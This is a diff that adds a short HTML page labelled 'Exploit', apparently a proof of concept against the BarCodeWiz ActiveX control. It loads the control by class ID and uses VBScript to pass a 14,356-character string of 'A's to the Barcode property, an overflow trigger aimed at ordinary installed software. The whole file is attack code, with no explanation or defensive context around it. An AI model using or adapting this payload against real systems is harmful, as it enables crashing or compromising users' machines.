@@ -1,0 +1,14 @@
+<html>
+Exploit
+<object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='poc'
+/></object>
+<script language='vbscript'>
+targetFile = "C:\Program Files (x86)\BarCodeWiz ActiveX
+Trial\DLL\BarcodeWiz.dll"
+prototype  = "Property Let Barcode As String"
+memberName = "Barcode"
+progid     = "BARCODEWIZLib.BarCodeWiz"
+argCount   = 1
+arg1=String(14356, "A")
+poc.Barcode = arg1
+</script>
